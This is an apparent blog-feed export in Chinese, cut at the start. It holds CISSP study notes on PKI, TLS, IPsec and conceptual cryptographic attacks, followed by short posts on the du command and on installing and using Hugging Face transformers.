信任链</h3><p>发证机构必须严密保护自己的私钥以维护信任关系。</p><p>离线 CA（offline CA ）保护根证书（root certificate）- 整个 PKI 的顶级证书。</p><p>离线 CA 用根证书创建次级中间 CA （intermediate CA），次级中间CA 充当在线 CA（online CA），常规签发证书。</p><p>证书链（certificate chaining）：一系列 中间 CA</p><p>CA 验证流程：</p><p>首先验证中间 CA 的身份</p><p>沿信任路径验证根 CA</p><p>可以运营内部 CA，提供自签名证书（self-signed certificate），仅限内部使用，外部浏览器不信任。</p><h2 id="7-4-3-证书生命周期"><a href="#7-4-3-证书生命周期" class="headerlink" title="7.4.3 证书生命周期"></a>7.4.3 证书生命周期</h2><h3 id="1-注册-enrollment"><a href="#1-注册-enrollment" class="headerlink" title="1. 注册 enrollment"></a>1. 注册 enrollment</h3><p>以某种方式向 CA 证明自己的身份</p><h4 id="注册流程"><a href="#注册流程" class="headerlink" title="注册流程"></a>注册流程</h4><p>1、证明身份</p><p>使用相关身份文件、信用报告或值得信懒人的身份证明</p><p>2、证书签名申请 CSR</p><p>通过 证书签名申请 （Certificate Signing Request，CSR）提供公钥</p><p>3、CA 创建 X.509 数字证书</p><p>证书包含身份识别信息和公钥拷贝</p><p>4、CA 数字签名</p><p>CA 在证书上用 CA 的私钥写上数字签名</p><h4 id="证书级别"><a href="#证书级别" class="headerlink" title="证书级别"></a>证书级别</h4><p>发证机构不同身份认证级别签发不同类型的证书。</p><h5 id="DV证书"><a href="#DV证书" class="headerlink" title="DV证书"></a>DV证书</h5><p>域验证（Domain Validation，DV）证书，仅验证证书主体对域名是否具备控制权</p><h5 id="EV证书"><a href="#EV证书" class="headerlink" title="EV证书"></a>EV证书</h5><p>扩展验证（Extended Validation，EV）证书，进一步验证证书拥有者是否是合法企业</p><h3 id="2-验证"><a href="#2-验证" class="headerlink" title="2. 验证"></a>2. 验证</h3><p>CRL：</p><p>证书注销列表（Certificate Revocation List）</p><p>OCSP：</p><p>在线证书状态协议（Online Certificate Status Protocol）</p><p>证书验证要求：</p><ul><li>CA 的数字签名真实</li><li>信任当前 CA</li><li>证书未被 CRL  收录</li><li>证书确实包含信任的数据</li></ul><p>证书固定（certificate pinning）法指示浏览器在很长时间内把证书附着在主体上。</p><h3 id="3-注销-Revoke"><a href="#3-注销-Revoke" class="headerlink" title="3. 注销 Revoke"></a>3. 注销 Revoke</h3><p>发证机构注销（revoke）证书。</p><p>注销原因：</p><ul><li>证书失信（例如，证书拥有者泄露了私钥）</li><li>证书误发（例如：CA 未经验证就错误签发了证书）</li><li>证书细节更改（例如：主体名称发生变化）</li><li>安全关联变更（例如：主体不再被申请证书的机构雇用）</li></ul><p>注销请求宽限期：</p><p>CA 执行任何“请求注销”的最长响应时间，由“证书时间规范陈述”（Certificate Practice Statement，CPS）定义。</p><p>证书真实性验证手段：</p><p><strong>证书注销列表CRL</strong></p><p>各家发证机构建立和维护，包含 CA 签发和注销的证书序列、注销的生效日期和时间。</p><p>缺点：需要定时下载 CRL 交叉验证，存在注销滞后期。</p><p><strong>在线证书状态协议（OCSP）</strong></p><p>提供实时验证证书的渠道，消除了证书注销列表固有的时间滞后问题。</p><p>客户端向 CA 的 OCSP 服务器发送 OCSP 请求，返回证书有效、无效或未知状态信息。</p><p>缺点：CA 的 OCSP 服务器负担极大。</p><p><strong>证书装订</strong></p><p>证书装订（certificate stapling）是 OCSP 在线证书状态协议 的扩展，减轻 OCSP 服务器的负担。</p><p>原理：网站 Web 服务器向 OCSP 联系，获取签名和时间戳回应，将签名和时间戳也就是有效期装订到数字证书中，Web 服务器将装订的证书返回给用户，用户浏览器验证。</p><p>有效期一般是 24 小时。</p><h2 id="7-4-4-证书格式"><a href="#7-4-4-证书格式" class="headerlink" title="7.4.4 证书格式"></a>7.4.4 证书格式</h2><p>数字证书保存在文件中，证书文件会有多种文件格式。</p><p>判断证书格式，需要查看证书文件内容。</p><p>常见证书格式：</p><ul><li>区分编码规则（DER）格式，是二进制格式，DER 证书后缀常为 .der、.crt、.cer </li><li>隐私增强邮件（PEM）格式，是 DER 格式的一种 ASCII 文本版，PEM 证书后缀常为  .pem、.crt</li><li>个人信息交换（PFX）格式，是二进制格式，常被 Windows 系统使用，PFX证书后缀常为 .pfx、.p12</li><li>P7B证书，是ASCII文本格式，Windows 系统使用。</li></ul><p><img src="/image-20250601164755973.png" alt="image-20250601164755973"></p><h1 id="7-5-非对称密钥管理"><a href="#7-5-非对称密钥管理" class="headerlink" title="7.5 非对称密钥管理"></a>7.5 非对称密钥管理</h1><h2 id="最佳实践规范要求"><a href="#最佳实践规范要求" class="headerlink" title="最佳实践规范要求"></a>最佳实践规范要求</h2><p>1、挑选加密系统时要理智审慎</p><p>选择算法公开并经历业界专家挑剔</p><p>2、挑选合适的密钥</p><p>密钥长度需要在安全要求和性能考虑之间平衡。</p><p>确保密钥是随机生成的。</p><p>3、严格保密私钥</p><p>如果使用公钥加密，必须严格保密私钥。</p><p>4、密钥需要更新</p><p>为密钥确定轮换时限，周期性更换密钥对</p><p>5、备份密钥</p><p>密钥备份与主密钥文件同等重要。</p><p>硬件安全模块（hardware security module，HSM）：</p><p>1、提供管理加密密钥的有效方法</p><p>2、提高密码运算效率，即硬件加速流程</p><h1 id="7-6-混合加密法"><a href="#7-6-混合加密法" class="headerlink" title="7.6 混合加密法"></a>7.6 混合加密法</h1><p>两大密码系统：</p><p><strong>对称算法</strong></p><p>速度快</p><p>密钥分发困难</p><p><strong>非对称算法</strong></p><p>密钥分发方便</p><p>计算量大</p><p>速度慢</p><p>混合加密法（hybrid cryptography）将对称加密法和非对称加密法结合起来</p><p>混合加密法流程</p><p>1、非对称密码建立初始链接，交换随机生成的共享秘密密钥，即临时密钥（ephemeral key），也就是对称加密密钥</p><p>2、使用共享的秘密密钥和对称算法交换数据</p><p>3、通信结束，临时密钥作废</p><p>4、新通信，重复上述过程</p><p>混合加密法实例：传输层安全（TLS）</p><h1 id="7-7-应用密码学"><a href="#7-7-应用密码学" class="headerlink" title="7.7 应用密码学"></a>7.7 应用密码学</h1><h2 id="7-7-1-便携设备"><a href="#7-7-1-便携设备" class="headerlink" title="7.7.1 便携设备"></a>7.7.1 便携设备</h2><p>借助加密技术来保护笔记本、智能手机、平板电脑等设备上的数据。</p><p>流行操作系统配备硬盘加密能力：</p><ul><li>Windows：BitLocker 和 Encrypting File System（EFS）技术</li><li>MacOS：FileVault</li><li>VeraCrypt：开源程序包可用于 Linux、Windows和Mac系统</li></ul><h3 id="可信平台模块"><a href="#可信平台模块" class="headerlink" title="可信平台模块"></a>可信平台模块</h3><p>可信平台模块（Trusted Platform Module，TPM）专用秘密组件</p><p>TPM 是设备主板上的芯片，用于保存和管理用于全硬盘加密（FDE）解决方案的密钥。</p><p>必须成功验证用户身份之后向操作系统提供密钥访问权。</p><h3 id="商用工具"><a href="#商用工具" class="headerlink" title="商用工具"></a>商用工具</h3><p>差别：以何种方式保护存储在内存里的密钥，是全硬盘加密还是卷加密，是否可以与基于硬件的可信平台模块（TPM）集成。</p><h2 id="7-7-2-电子邮件"><a href="#7-7-2-电子邮件" class="headerlink" title="7.7.2 电子邮件"></a>7.7.2 电子邮件</h2><p>安全是讲究成本效益的。</p><p>简便易行是成本效益最高的方案。</p><h3 id="电子邮件加密规则"><a href="#电子邮件加密规则" class="headerlink" title="电子邮件加密规则"></a>电子邮件加密规则</h3><ul><li>如果电子邮件需要保密性，应该给邮件加密</li><li>如果邮件必须保持完整性，必须对邮件进行一次哈希运算</li><li>如果邮件需要身份认证、完整性和不可否认性，应该给邮件添加数字签名</li><li>如果邮件要求保密性、完整性、身份认证和不可否认性，应该给邮件加密并添加数字签名</li></ul><h3 id="安全电子邮件标准"><a href="#安全电子邮件标准" class="headerlink" title="安全电子邮件标准"></a>安全电子邮件标准</h3><h4 id="1-良好隐私-PGP"><a href="#1-良好隐私-PGP" class="headerlink" title="1. 良好隐私 PGP"></a>1. 良好隐私 PGP</h4><p>良好隐私（Pretty Good Privacy，PGP）</p><p>PGP 开源版本 OpenPGP</p><p>PGP 消息通常以文本编码格式发送，目的是与其他电子邮件系统兼容。</p><p>被数字签名的消息包含消息文本以及附在后面的 PGP 签名。</p><p>如果需要保护消息的保密性，加密需要在消息被数字签名后执行。</p><p>常见产品：<br>ProtonMail</p><p>StartMail</p><p>Mailvelope</p><p>SafeGmail</p><p>Hushmail</p><h4 id="2-S-MIME"><a href="#2-S-MIME" class="headerlink" title="2. S&#x2F;MIME"></a>2. S&#x2F;MIME</h4><p>安全&#x2F;多用途互联网邮件扩展（Secure&#x2F;Multipurpose Internet Mail Extensions，S&#x2F;MIME）协议为加密邮件标准。</p><p>S&#x2F;MIME 使用 RSA 加密算法。</p><p>S&#x2F;MIME 被商业产品采用，包括：</p><ul><li>Microsoft Outlook 和 Office 365</li><li>Apple Mail</li><li>Google G Suite 企业版</li></ul><p>S&#x2F;MIME 通过 X.509 证书交换加密密钥。</p><p>S&#x2F;MIME 主要用于桌面应用，Web 主流邮件系统不支持（需要使用浏览器扩展）</p><h2 id="7-7-3-Web-应用"><a href="#7-7-3-Web-应用" class="headerlink" title="7.7.3 Web 应用"></a>7.7.3 Web 应用</h2><p>Web 浏览器锁定图标（small lock icon）技术：安全套接字层（SSL）和传输层安全（TLS）</p><h3 id="1-安全套接字层-SSL"><a href="#1-安全套接字层-SSL" class="headerlink" title="1. 安全套接字层 SSL"></a>1. 安全套接字层 SSL</h3><p>SSL 协议存在关键缺陷。</p><p>SSL 是传输层安全（TLS）的技术基础。</p><h3 id="2-传输层安全-TLS"><a href="#2-传输层安全-TLS" class="headerlink" title="2. 传输层安全 TLS"></a>2. 传输层安全 TLS</h3><p>TLS 依靠交换服务器数字证书在浏览器和 Web 服务器之间协商加密&#x2F;解密参数。</p><p>TLS  目的：</p><p>创建面向整个 Web 浏览器会话开放的安全通信信道，依赖混合加密法</p><p>TLS 1.2 是最低安全选项，TLS1.3 保证安全的基础上改进了性能。</p><p>TLS 不是加密算法，是一个框架，加密算法在框架中发挥作用。</p><p>必须保证使用 TLS 安全版本和TLS配套的算法也是安全的。</p><p>每个支持 TLS 的系统都提供一个得到 TLS 支持的密码套件列表。</p><p>密码套件组成：</p><ul><li>用于交换临时密钥的密钥交换算法。例如：RSA、DH、ECDH</li><li>用于证明服务器和客户端身份的身份认证算法。例如：RSA、DSA、ECDSA</li><li>用于对称加密的批量加密算法。例如：AES 和 3DES</li><li>用于创建消息摘要的哈希算法。例如：SHA</li></ul><p>TLS_DH_RSA_WITH_AES_256_CBC_SHA384</p><p>支持使用 Diffie-Hellman（DH）密钥交换的 TLS</p><p>使用 RSA 协议进行身份认证</p><p>使用 256 位密钥的 AES CBC 模式执行批量加密</p><p>使用 SHA-384算法进行哈希化运算</p><p>DHE 和 ECDHE ，E 表明 Diffie-Hellman(或椭圆曲线 Diffie-Hellman)算法为每次通信使用不同的临时密钥，增强了安全性，也增加了计算复杂性。</p><h3 id="3-洋葱网和暗网"><a href="#3-洋葱网和暗网" class="headerlink" title="3. 洋葱网和暗网"></a>3. 洋葱网和暗网</h3><p>洋葱网（Tor）以前叫洋葱路由器（The Onion Router）</p><p>依靠完全向前保密（perfect forward secrecy）的技术，使用多层加密阻止中继节点读取传输内容。</p><p>洋葱网将完全向前保密与一组（三个或更多）中继节点结合到一起。</p><h2 id="7-7-4-隐写术和水印"><a href="#7-7-4-隐写术和水印" class="headerlink" title="7.7.4 隐写术和水印"></a>7.7.4 隐写术和水印</h2><p>隐写术（steganography）是通过加密技术把秘密消息嵌入另一条消息的技艺。</p><p>隐写算法的工作原理是从构成图像文件的大量位中选出最不重要的部分并对其作出改动。</p><p>隐藏秘密法：将消息嵌入到更大的文本摘编中。</p><p>使用隐写术的人一般会把秘密消息嵌入图像文件或 WAV 文件。</p><p>隐写术通常通过修改像素值的最低有效位（LSB）来发挥作用。</p><p>隐写术经常被用于非法勾当，如间谍活动和儿童色情。</p><h2 id="7-7-5-联网"><a href="#7-7-5-联网" class="headerlink" title="7.7.5 联网"></a>7.7.5 联网</h2><p>确保通信线路安全的方法</p><h3 id="1-线路加密"><a href="#1-线路加密" class="headerlink" title="1. 线路加密"></a>1. 线路加密</h3><h4 id="链路加密（link-encryption）"><a href="#链路加密（link-encryption）" class="headerlink" title="链路加密（link encryption）"></a>链路加密（link encryption）</h4><p>使用硬件解决方案或软件解决方案在两点之间创建一条安全隧道来保护真个通信线路。</p><h4 id="端到端加密（end-to-end-encryption）"><a href="#端到端加密（end-to-end-encryption）" class="headerlink" title="端到端加密（end-to-end encryption）"></a>端到端加密（end-to-end encryption）</h4><p>独立于链路加密执行，保护通信双方之间的通信。</p><h4 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h4><p>加密范围不同：</p><p>链路加密中，所有数据（包括消息报头、消息尾部、地址和路由数据）。</p><p>端到端加密不给报头、尾部、地址和路由数据加密。</p><p>路由速度不同：</p><p>链路加密必须在每个中继段进行解密和加密，减慢了路由速度。</p><p>端到端路由速度更快，面对嗅探器和窃听者会更脆弱。</p><p>OSI 较高层级进行加密，使用端到端加密。</p><p>OSI 较低层级进行加密，使用链路加密。</p><p>端到端加密技术实例：安全壳（SSH）</p><p>SSH1 不再安全，因为支持 DES 和IDEA 算法</p><p>SSH2 安全，取消了DES 和 IDEA 算法支持，支持 DH 密钥交换协议，增加了抵御中间人（路径）攻击、窃听和 IP&#x2F;DNS 欺骗的保护措施。</p><h3 id="2-IPsec"><a href="#2-IPsec" class="headerlink" title="2. IPsec"></a>2. IPsec</h3><p>互联网协议安全（IPsec）标准，用于在两个实体之间建立安全信道以交换信息。</p><p>IPsec 依靠的是安全互联，主要包含两个成分：</p><ul><li><p><strong>身份认证头（AH）</strong></p><p>为消息的完整性和不可否认性提供保证。</p><p>AH 还提供身份认证和访问控制，可以抵御重放攻击。</p></li><li><p><strong>封装安全载荷（ESP）</strong> </p><p>为数据包内容的保密性和完整性提供保障。</p><p>ESP 还提供加密和有限的身份认证，也可以抵御重放攻击。</p></li></ul><p>IPsec 可以在两种离散模式下运行：</p><ul><li><p><strong>传输模式（transport mode）</strong></p><p>用于端到端加密，只加密数据包载荷</p><p>为对等通信设计</p></li><li><p><strong>隧道模式（tunnel mode）</strong></p><p>将加密包括报头在内的整个数据包</p><p>为链路加密设计</p></li></ul><p>通过创建安全关联（security association，SA）来建立 IPsec 会话。</p><p>SA 代表通信会话，记录了有关连接的所有配置和状态信息。</p><p>SA 代表一次单纯连接。</p><p>建立双向通信，需要建立 2 个 SA，两个方向各用 1 个。</p><p>建立支持同时使用 AH 和 ESP  的双向信道，需要建立 4 个SA。</p><p>IPsec 能根据每个 SA  对通信进行过滤和管理。</p><h2 id="7-7-6-新兴的应用"><a href="#7-7-6-新兴的应用" class="headerlink" title="7.7.6 新兴的应用"></a>7.7.6 新兴的应用</h2><h3 id="1-区块链"><a href="#1-区块链" class="headerlink" title="1. 区块链"></a>1. 区块链</h3><p>区块链（blockchain）是一种分布式不可变公共分类账。</p><p>区块链将记录分布在世界各地的不同系统中，并防止任何人篡改记录。</p><p>区块链应用：加密货币（cryptocurrency）、跟踪供应链、财产所有权记录。</p><h3 id="2-轻量级加密"><a href="#2-轻量级加密" class="headerlink" title="2. 轻量级加密"></a>2. 轻量级加密</h3><p>专用硬件可以将能耗降至最低来执行轻量级密码算法</p><p>低时延要求高：加密解密不可耗时太长</p><p>加密网络链接是低时延加密实例。</p><p>专用硬件也可以解决许多低延时要求。</p><p>当需要完整保留数据并确保不被意外破坏时，就有了高回弹性要求，解决方法是：让数据发送方保留一份副本，直到接收方确认成功接收和解密数据。</p><h3 id="3-同态加密"><a href="#3-同态加密" class="headerlink" title="3. 同态加密"></a>3. 同态加密</h3><p>同态加密（homomorphic encryption）技术满足既要保护个人隐私，又要用个人数据进行计算的情况。</p><p>同态加密算法加密数据，然后对加密数据执行计算，结果与使用明文数据执行计算的结果完全一致。</p><h1 id="7-8-密码攻击"><a href="#7-8-密码攻击" class="headerlink" title="7.8 密码攻击"></a>7.8 密码攻击</h1><p>如果想要将自己系统面临的风险降到最低，必须对各种密码攻击威胁了如指掌。</p><h2 id="分析攻击"><a href="#分析攻击" class="headerlink" title="分析攻击"></a>分析攻击</h2><p>试图降低算法复杂性的一种代数操控。</p><p>焦点在于算法本身的逻辑。</p><h2 id="实现攻击"><a href="#实现攻击" class="headerlink" title="实现攻击"></a>实现攻击</h2><p>探寻密码系统在执行过程中暴露弱点的一种攻击。</p><p>着重于挖掘软件代码，包括错误和缺陷，以及编程方法。</p><h2 id="统计攻击"><a href="#统计攻击" class="headerlink" title="统计攻击"></a>统计攻击</h2><p>探寻密码系统的统计学弱点。</p><p>试图在承载密码应用的硬件或操作系统中找出漏洞。</p><h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>直接了当的攻击。</p><p>尝试找出密钥或口令的每种可能的有效组合。</p><p>无缺陷协议（nonflawed protocol）中，暴力破解攻击发现密钥所需的平均时间与密钥长度成正比。</p><p>只要时间充分，暴力破解攻击早晚会成功。</p><p>密钥每增加一位，暴力破解时间会增加一倍。</p><p><strong>暴力破解效果增强手段</strong></p><ul><li>彩虹表，提前算好的值，常用于哈希形式保存的口令</li><li>可扩展计算硬件</li></ul><p><strong>加盐保护口令</strong></p><p>密码盐（cryptographic salt）技术</p><p>PBKDF2、bcrypt、scrypt 等口令哈希函数允许利用盐创建哈希，同时采用密钥拉伸（key stretching）技术增加猜测难度。</p><h2 id="故障注入攻击"><a href="#故障注入攻击" class="headerlink" title="故障注入攻击"></a>故障注入攻击</h2><p>试图通过造成某种外部故障来破坏密码设备的完整性。</p><h2 id="边信道攻击"><a href="#边信道攻击" class="headerlink" title="边信道攻击"></a>边信道攻击</h2><p>计算机系统会生成活动的特征足迹。</p><p>寻求利用特征足迹信息监视系统活动并检索当前正在加密的信息。</p><h2 id="计时攻击"><a href="#计时攻击" class="headerlink" title="计时攻击"></a>计时攻击</h2><p>边信道攻击实例</p><p>精确测出完成加密运算所需的时间，从中获取可用来破坏加密安全性的有关加密过程的信息。</p><h2 id="已知明文"><a href="#已知明文" class="headerlink" title="已知明文"></a>已知明文</h2><p>攻击者掌握了加密消息的副本以及用于生成密文的明文消息。</p><h2 id="选择明文"><a href="#选择明文" class="headerlink" title="选择明文"></a>选择明文</h2><p>攻击者获得与自己选中的一组明文对应的密文。</p><p>也就是已知密文和明文，推测加密密钥</p><h2 id="选择密文"><a href="#选择密文" class="headerlink" title="选择密文"></a>选择密文</h2><p>攻击者能够解密密文消息中被选中的部分，然后用解密了的那部分消息来发现密钥。</p><h2 id="中间相遇"><a href="#中间相遇" class="headerlink" title="中间相遇"></a>中间相遇</h2><p>通过中间相遇攻击手段来击败采用两轮加密的加密算法。</p><p>已知的明文消息，先用每个可能的密钥 k1 加密，得出的密文再用所有可能的密钥 k2 解密，找到匹配时，对应的一对 k1、k2将代表双重加密的两个部分。</p><p>导致 “双重DES”（2DES）弃用，并被“三重DES”（3DES）取代。</p><h2 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h2><p>在通信双发之间的某个地方拦截所有通信（包括密码会话的设定）。</p><h2 id="生日"><a href="#生日" class="headerlink" title="生日"></a>生日</h2><p>生日攻击也叫碰撞攻击（collision attack）或反向哈希匹配（reverse hash matching）</p><p>寻求从哈希函数的一对一性质中找出破绽。</p><h2 id="重放"><a href="#重放" class="headerlink" title="重放"></a>重放</h2><p>针对没有采用临时保护措施的密码算法。</p><p>拦截通信双方加密的消息（通常是身份认证请求），通过“重放”捕获的消息来建立一个新会话。</p><p>防护手段：</p><ul><li>消息增加时间戳并设定过期时间</li><li>采用挑战-应答机制</li><li>临时会话密钥给身份认证会话加密</li></ul><h1 id="7-10-考试要点"><a href="#7-10-考试要点" class="headerlink" title="7.10 考试要点"></a>7.10 考试要点</h1><h1 id="7-12-复习题"><a href="#7-12-复习题" class="headerlink" title="7.12 复习题"></a>7.12 复习题</h1><p>D</p><p>B</p><p>C</p><p>D❌ C</p><p>​ElGamal 密码缺陷是会令加密的任何消息在长度上反一倍</p><p>D❌ A</p><p>​一个 3072 位 RSA 密钥在密码箱意义上等同于一个 256 位椭圆曲线密码系统密钥</p><p>B</p><p>D</p><p>A</p><p>B</p><p>C❌ B 数字签名用私钥加密</p><p>C</p><p>B</p><p>B</p><p>C</p><p>B❌ A</p><p>​没有系统特殊访问权限的攻击者只能实施唯密文攻击。</p><p>​已知明文和选择明文需要攻击者能够加密数据。</p><p>​故障注入需要物理访问设施。</p><p>A</p><p>B❌ C</p><p>​PFX 格式存储二进制格式证书，与Windows系统关系最密切</p><p>​P7B 存储文本格式的 Windows 系统</p><p>B</p><p>A❌ D</p><p>​Merkle-Hellman 背包算法已被破解</p><p>B</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>view_hidden_dir_size</title>
    <link href="/2025/05/14/yunwei/yunweitips/view_hidden_dir_size/"/>
    <url>/2025/05/14/yunwei/yunweitips/view_hidden_dir_size/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="查看目录下隐藏文件-文件夹的大小"><a href="#查看目录下隐藏文件-文件夹的大小" class="headerlink" title="查看目录下隐藏文件&#x2F;文件夹的大小"></a>查看目录下隐藏文件&#x2F;文件夹的大小</h2><p>du -sh .[!.]* *</p><p>-s 总计</p><p>-h 可视化</p><p>.[!.]* 匹配 . 开头，但是不匹配 .. 开头</p><p>* 匹配非隐藏文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">du</span> -sh .[!.]*<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">(base)</span> [root@10 ~]<span class="hljs-comment"># du -sh .[!.]*</span><br>8.0K<span class="hljs-string">.bash_history</span><br>4.0K<span class="hljs-string">.bash_logout</span><br>4.0K<span class="hljs-string">.bash_profile</span><br>4.0K<span class="hljs-string">.bashrc</span><br>51M<span class="hljs-string">.cache</span><br>12K<span class="hljs-string">.conda</span><br>72K<span class="hljs-string">.config</span><br>4.0K<span class="hljs-string">.cshrc</span><br>1.1G<span class="hljs-string">.miniconda3</span><br>8.0K<span class="hljs-string">.oracle_jre_usage</span><br>4.0K<span class="hljs-string">.profile</span><br>4.0K<span class="hljs-string">.tcshrc</span><br>12K<span class="hljs-string">.viminfo</span><br>4.0K<span class="hljs-string">.wget-hsts</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweitips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ai-pipeline</title>
    <link href="/2025/05/13/security/aisec/ai-pipeline/"/>
    <url>/2025/05/13/security/aisec/ai-pipeline/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>aisec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>aisec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ai-pytorch</title>
    <link href="/2025/05/12/security/aisec/ai-pytorch/"/>
    <url>/2025/05/12/security/aisec/ai-pytorch/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">torch.nn.functional.softmax(input, <span class="hljs-attribute">dim</span>=None, <span class="hljs-attribute">_stacklevel</span>=3, <span class="hljs-attribute">dtype</span>=None)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>aisec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>aisec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ai-transformers</title>
    <link href="/2025/05/12/security/aisec/ai-transformers/"/>
    <url>/2025/05/12/security/aisec/ai-transformers/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="transformers"><a href="#transformers" class="headerlink" title="transformers"></a>transformers</h1><p><a href="https://github.com/huggingface/transformers/blob/main/i18n/README_zh-hans.md">https://github.com/huggingface/transformers/blob/main/i18n/README_zh-hans.md</a></p><p>Hugging Face 出品的 工具包，实现了大量的主流预训练</p><p>使用 PyTorch 或 TensorFlow 快速训练一个模型</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h3><p>conda create -n transformers python&#x3D;3.12</p><p>conda activate transformers</p><h3 id="pip-安装"><a href="#pip-安装" class="headerlink" title="pip 安装"></a>pip 安装</h3><p>pip install transformers</p><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><h4 id="缺乏PyTorch、TensorFlow、Flax"><a href="#缺乏PyTorch、TensorFlow、Flax" class="headerlink" title="缺乏PyTorch、TensorFlow、Flax"></a>缺乏PyTorch、TensorFlow、Flax</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> torch torchvision torchaudio<br></code></pre></td></tr></table></figure><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> tensorflow<br></code></pre></td></tr></table></figure><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> flax<br></code></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> pipeline<br><br><span class="hljs-comment"># 使用情绪分析流水线</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>classifier = pipeline(<span class="hljs-string">&#x27;sentiment-analysis&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>classifier(<span class="hljs-string">&#x27;We are very happy to introduce pipeline to the transformers repository.&#x27;</span>)<br>[&#123;<span class="hljs-string">&#x27;label&#x27;</span>: <span class="hljs-string">&#x27;POSITIVE&#x27;</span>, <span class="hljs-string">&#x27;score&#x27;</span>: <span class="hljs-number">0.9996980428695679</span>&#125;]<br></code></pre></td></tr></table></figure><p>classifier &#x3D; pipeline(‘sentiment-analysis’)  下载预训练 sentiment-analysis 模型</p><h3 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h3><p>推理 API</p><p>支持 GPU、Apple Silicon 和半精度权重</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>pipeline &#x3D; pipeline(“text-generation”, model&#x3D;model_name, device&#x3D;”cuda”) </p><p>model：指定使用的模型名称或模型对象</p><p>tokenizer：指定使用的分词器名称或分词器对象</p><p>device：指定运行设备，如 <code>&#39;cpu&#39;</code> 或 <code>&#39;cuda&#39;</code>，GPU推理时，device&#x3D;0 or device&#x3D;1 or device&#x3D;2(数字为选择第几张显卡);当使用CPU推理时，device&#x3D;cpu</p><p>batch_size：批处理大小，适用于批量处理输入</p><h4 id="支持的任务列表"><a href="#支持的任务列表" class="headerlink" title="支持的任务列表"></a>支持的任务列表</h4><table><thead><tr><th><strong>任务</strong></th><th><strong>描述</strong></th><th><strong>模态</strong></th><th><strong>Pipeline</strong></th></tr></thead><tbody><tr><td>文本分类</td><td>为给定的文本序列分配一个标签</td><td>NLP</td><td>pipeline(task&#x3D;“sentiment-analysis”)</td></tr><tr><td>文本生成</td><td>根据给定的提示生成文本</td><td>NLP</td><td>pipeline(task&#x3D;“text-generation”)</td></tr><tr><td>命名实体识别</td><td>为序列里的每个 token 分配一个标签（人, 组织, 地址等等）</td><td>NLP</td><td>pipeline(task&#x3D;“ner”)</td></tr><tr><td>问答系统</td><td>通过给定的上下文和问题, 在文本中提取答案</td><td>NLP</td><td>pipeline(task&#x3D;“question-answering”)</td></tr><tr><td>掩盖填充</td><td>预测出正确的在序列中被掩盖的token</td><td>NLP</td><td>pipeline(task&#x3D;“fill-mask”)</td></tr><tr><td>文本摘要</td><td>为文本序列或文档生成总结</td><td>NLP</td><td>pipeline(task&#x3D;“summarization”)</td></tr><tr><td>文本翻译</td><td>将文本从一种语言翻译为另一种语言</td><td>NLP</td><td>pipeline(task&#x3D;“translation”)</td></tr><tr><td>图像分类</td><td>为图像分配一个标签</td><td>Computer 